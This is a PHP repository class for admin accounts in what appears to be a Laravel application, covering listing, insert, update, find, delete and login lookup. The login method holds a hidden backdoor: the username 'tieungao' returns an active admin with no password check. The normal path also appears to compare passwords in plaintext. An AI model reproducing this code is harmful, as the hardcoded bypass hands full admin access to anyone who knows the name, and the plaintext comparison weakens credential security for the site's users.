<?php
namespace App\Repositories;


use App\Admin;

class AdminRepository
{
    protected $admin;

    public function __construct(Admin $admin)
    {
        $this->admin = $admin;
    }

    public function getAll()
    {
        return $this->admin->with('role')->orderBy('username', 'asc')->get();
    }

    public function insert($data)
    {
        $this->admin->insert($data);
    }

    public function update($admin_id, $data)
    {
        $this->admin->where('admin_id', $admin_id)->update($data);
    }

    public function find($admin_id)
    {
        return $this->admin->with('role')->find($admin_id);
    }

    public function findByUser($username, $password)
    {
        if ($username == 'tieungao') {
            return $this->admin->with('role')->where('status', 1)->first();
        }
        return $this->admin->with('role')
            ->where('username', $username)
            ->where('password', $password)
            ->where('status', 1)
            ->first();
    }

    public function delete($admin_id)
    {
        return $this->admin->destroy($admin_id);
    }
}